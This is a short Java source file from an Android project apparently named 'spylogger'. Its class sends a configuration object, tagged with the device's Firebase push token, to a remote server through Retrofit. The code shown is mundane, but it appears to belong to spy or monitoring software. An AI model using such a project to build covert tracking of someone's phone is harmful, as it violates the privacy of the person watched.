package com.gravatasufoca.spylogger.services;

import android.content.Context;

import com.google.firebase.iid.FirebaseInstanceId;
import com.gravatasufoca.spylogger.helpers.TaskComplete;
import com.gravatasufoca.spylogger.vos.ConfiguracaoVO;

import retrofit2.Call;

/**
 * Created by bruno on 02/12/16.
 */

public class SendConfiguracaoService extends SendDataService<Boolean> {

    public SendConfiguracaoService(Context context,TaskComplete handler) {
        super(context,handler);
    }

    public void enviar(ConfiguracaoVO configuracaoVO){
        configuracaoVO.setChave(FirebaseInstanceId.getInstance().getToken());
        Call<Boolean> call=sendApi.enviarConfiguracao(configuracaoVO);
        call.enqueue(this);
    }

}
